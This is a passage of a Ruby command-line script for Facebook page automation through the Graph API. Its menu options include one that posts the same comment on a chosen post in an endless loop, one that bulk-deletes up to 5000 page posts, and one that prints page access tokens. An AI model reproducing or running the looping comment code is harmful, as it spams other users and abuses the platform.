          puts ("#{$y}[!] Failed : #{f}")
          puts ("#{$w}[+] Total  : #{s + f}#{$a}")
        end
      else
        puts ("#{$y}[!] Your Account Does Not Have A Page With Id #{id}")
      end
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      PageMenu()
    when '4'
      s = 0
      f = 0
      system ('clear')
      puts ($logo)
      puts ("#{$w}[!] Use <> For New Line")
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Your Page Id : ")
      id = gets.chomp!
      print ("#{$w}[+] Page Post Id : ")
      posts = gets.chomp!
      print ("#{$w}[+] Message : ")
      body = gets.chomp!
      body = body.tr("<>","\n")
      puts ("#{$w}[!] CTRL + C TO STOP")
      puts ("#{$w}#{'═'*52}")
      req = Request("me/accounts?fields=name,access_token")
      token = req['data'].map {|i| i['access_token'] if i['id'] == id}[0].to_s
      if token.match? ('EAA')
        a = Net::HTTP.get(URI("https://graph.facebook.com/#{posts}?fields=from&access_token=#{token}"))
        b = JSON.parse(a)
        if b.key? ('from')
          loop do
            begin
              uri = URI("https://graph.facebook.com/#{posts}/comments")
              data = {"message"=>body,"access_token"=>token}
              req = Net::HTTP.post_form(uri,data)
              res = JSON.parse(req.body)
              if res.key? ('id')
                s += 1
                puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success -> #{posts}")
              else
                f += 1
                puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed -> #{posts}")
              end
            rescue Interrupt
              break
            end
          end
          puts ("\n#{$w}#{'═'*52}")
          puts ("#{$g}[✓] Succes : #{s}")
          puts ("#{$y}[!] Failed : #{f}")
          puts ("#{$w}[+] Total  : #{s + f}#{$a}")
        else
          puts (b)
          puts ("#{$y}[!] Post Not Found")
        end
      else
        puts ("#{$y}[!] Your Account Does Not Have A Page With Id #{id}")
      end
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      PageMenu()
    when '5'
      s = 0
      f = 0
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Your Page Id : ")
      id = gets.chomp!
      req = Request("me/accounts?fields=name,access_token")
      token = req['data'].map {|i| i['access_token'] if i['id'] == id}[0].to_s
      if token.match? ('EAA')
        puts ("#{$w}[+] Page Name : #{req['data'][0]['name']}")
        puts ("#{$w}[!] CTRL + C TO STOP")
        puts ("#{$w}#{'═'*52}")
        a = Net::HTTP.get(URI("https://graph.facebook.com/#{id}?fields=feed.limit(5000)&access_token=#{token}"))
        b = JSON.parse(a)
        if b.key? ('error')
          puts (b)
          abort ("#{$r}[!] Error#{$a}")
        elsif !b.key? ('feed')
          puts ("#{$y}[!] No Posts")
        else
          for i in b['feed']['data']
            begin
              posts = i['id']
              uri = URI("https://graph.facebook.com/#{posts}?method=DELETE&access_token=#{token}")
              del = Net::HTTP.get(uri)
              if del.include? ('true')
                s += 1
                puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success -> #{posts}")
              else
                f += 1
                puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed -> #{posts}")
              end
            rescue Interrupt
              puts ("\n") ; break
            end
          end
          puts ("#{$w}#{'═'*52}")
          puts ("#{$g}[✓] Succes : #{s}")
          puts ("#{$y}[!] Failed : #{f}")
          puts ("#{$w}[+] Total  : #{s + f}#{$a}")
        end
      else
        puts ("#{$y}[!] Your Account Does Not Have A Page With Id #{id}")
      end
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      PageMenu()
    when '6'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      puts ("#{$w}[+] From #{$name}")
      puts ("#{$w}[!] START...")
      puts ("#{$w}#{'═'*52}")
      req = Request("me/accounts?fields=name,access_token")
      if req.key? ('error')
        abort ("#{req}\n#{$r}[!] Error")
      elsif req['data'].empty?
        puts ("#{$y}[!] Your Account Does Not Have a Fan Page")
      else
        for i in req['data']
          puts ("#{$w}[#{$g}✓#{$w}] Page Name : #{i['name']}")
          puts ("#{$w}[#{$g}✓#{$w}] Page Id : #{i['id']}")
          puts ("#{$w}[#{$g}✓#{$w}] Access Token : #{i['access_token']}\n\n")
        end
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        PageMenu()
      end
    when '0'
      lain()
    else
      puts ("#{$y}[!] Invalid Input")
      sleep(0.9)
      PageMenu()
  end
end
  

if __FILE__ == $0
  system("printf \"\033]0;Facebook\007\"")
  Masuk()
end
